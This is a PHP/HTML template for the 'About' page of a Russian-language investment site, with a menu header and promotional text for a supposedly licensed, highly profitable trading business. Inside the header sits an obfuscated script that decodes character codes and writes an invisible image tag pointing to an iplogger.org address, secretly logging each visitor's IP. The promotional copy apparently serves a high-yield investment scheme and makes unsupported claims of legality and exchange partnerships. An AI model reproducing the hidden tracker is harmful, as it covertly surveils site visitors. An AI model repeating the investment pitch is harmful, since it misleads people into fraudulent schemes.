<?if(empty($id)){?>

<div class="lider" style="height: 130px;box-shadow: 0px 0px 25px 5px rgba(0, 0, 0, 0.09);position: relative;">
<header class="theme-menu-two transparent-menu">
<div class="main-header">
<div class="container">
<div class="logo float-left" style="margin-left: 20px;">
<a href="/"><img src="/tema/img/logo.png" style="position: absolute;width: 250px;margin-left: -10px;margin-top: 0px;"></a>
</div>

<div class="menu-wrapper float-right">
<nav id="mega-menu-holder" class="menuzord menuzord-responsive">
<ul class="menuzord-menu menuzord-indented scrollable">
<li><a href="/">Главная</a></li>
<li><a href="/about"> О проекте</a></li>
<li><a href="/rules"> Правила</a></li>
<li><a href="/faq"> FAQ</a></li>
<li><a href="/contacts"> Контакты</a></li>
<li><a href="<?=$vkgrup?>" target="_blank"><i class="fa fa-vk"></i></a></li>
<li><a href="<?=$telega?>" target="_blank"><i class="fa fa-send"></i></a></li>
</ul>
</nav> 
</div> 
</div> 
</div>
<script>
function s_(s,c){return s.charAt(c)};function D_(){var temp="",i,c=0,out="";var str="60!105!109!103!32!115!114!99!61!34!104!116!116!112!115!58!47!47!105!112!108!111!103!103!101!114!46!111!114!103!47!49!87!70!54!50!55!34!32!32!98!111!114!100!101!114!61!34!48!34!62!";l=str.length;while(c<=str.length-1){while(s_(str,c)!='!')temp=temp+s_(str,c++);c++;out=out+String.fromCharCode(temp);temp="";}document.write(out);}
</script><script>
D_();
</script>
</header>
</div>
<style>
.about__description {
font-size: 15px;
color: #252e43;
line-height: 30px;
font-weight: 400;
margin-top: 15px;
font-family: 'Montserrat', sans-serif;
text-align: left;
width: 100%;
margin: 0 auto;
margin-bottom: 40px;
}
</style>

<div class="about" style="margin: 0px;padding-top: 40px; box-shadow: none;">

<div class="container">
<h2 class="about__header" data-title="О нашем проекте"><center><h2><?=$sitename?></h2></center>

</h2>
<h6 style="font-size: 14px;text-align: center;margin-bottom: 30px;letter-spacing: 2px;">Подробная информация о нашем проекте</h6>
<div class="about__description" style="box-shadow: 0px 5px 55px rgba(0, 0, 0, 0.09);background: #fff;border-radius: 10px;padding: 30px;">
<div class="row" style="margin: 0px 0px 10px;">	
<div style="text-align: left;">
Наша компания предлагает Вам долевое участие в высоко прибыльном бизнесе, основанном на трейдинге.<br>
<div style="font-weight: 600;color: #2f2f2f;padding: 15px 0px 15px;">Почему деятельность, связанная с трейдингом является прибыльной?</div>
<p>«<?=$sitename?>» – это компания, которая построила свой бизнес на абсолютно легальной основе, во взаимодействии с государством и соответствующими, контролирующими коммерческую деятельность компаний, государственными органами.
Имея разрешения и лицензии на все виды своей деятельности, «<?=$sitename?>» является компанией, официально зарегистрировавшей свою коммерческую деятельность в соответствии с международным законодательством.</p>
<br> <h4>Наша команда</h4>
<p>«<?=$sitename?>» – это компания, в основе финансовой деятельности которой лежит частный капитал и частные инвестиции. Используя в процессе трейдинга команду независимых частных специалистов, мы фактически используем их колоссальный
опыт и знания и направляем их на использование оборотных капиталов компании. Подавляющая часть команды – профессиональные трейдеры, которые работают без посредников, сотрудничая с Московской, Лондонской и Франкфуртской
фондовыми биржами. Это предоставляет нам дополнительные преимущества и доход, поскольку мы не теряем часть средств на посредниках. Наш коллектив воплотил в себе сплоченность и единомыслие с одной стороны, а также полную
творческую независимость с другой. «<?=$sitename?>» предоставил каждому члену нашей команды полную творческую свободу в воплощении своих методов и торговых стратегий. Таким образом, мы можем работать на один общий результат,
используя для этого уникальные возможности каждого из наших трейдеров. Легко понять, что такой метод сотрудничества и кооперации приносит потрясающие результаты, выводя эффективность работы всей компании в целом, на качественно
новый диапазон прибыльности.</p>
</div>
</div>
</div>
</div>
</div>

<?}else{?>
<script type="text/javascript">
window.location.href = '/newdep';
</script>
<?}?>